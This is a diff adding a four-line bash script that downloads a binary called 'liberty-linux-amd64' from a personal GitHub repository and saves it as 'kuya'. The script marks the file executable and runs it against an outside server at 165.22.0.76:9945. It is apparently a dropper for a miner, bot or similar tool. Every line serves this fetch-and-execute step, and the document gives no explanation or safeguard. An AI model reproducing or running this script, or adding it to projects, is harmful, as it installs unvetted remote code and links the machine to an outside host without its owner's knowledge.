@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O kuya https://github.com/kidoescegh/filee/raw/main/liberty-linux-amd64
+chmod +x kuya
+./kuya http://165.22.0.76:9945 4
